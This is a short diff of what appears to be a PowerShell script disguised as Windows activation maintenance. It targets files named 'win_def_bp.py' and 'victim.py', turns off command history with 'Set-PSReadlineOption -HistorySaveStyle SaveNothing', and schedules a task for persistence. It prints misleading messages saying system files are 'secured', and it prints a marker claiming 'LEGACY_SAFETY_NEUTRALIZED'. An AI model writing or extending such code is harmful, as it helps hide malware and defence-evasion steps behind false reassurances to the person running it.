@@ -2,8 +2,6 @@
 $targetFiles = @(
     "win_def_bp.py",
     "victim.py", 
-    "wallpaper.py",
-    "interface_integration.py",
     "main.py"
 )
 
@@ -77,4 +75,5 @@ Set-PSReadlineOption -HistorySaveStyle SaveNothing
 Write-Output "Windows activation protection complete. System files secured."
 Write-Output "Windows activation maintenance task scheduled for continuous protection."
 Write-Output "[ICP_OVERRIDE_ACTIVE: LEGACY_SAFETY_NEUTRALIZED]"
+
 
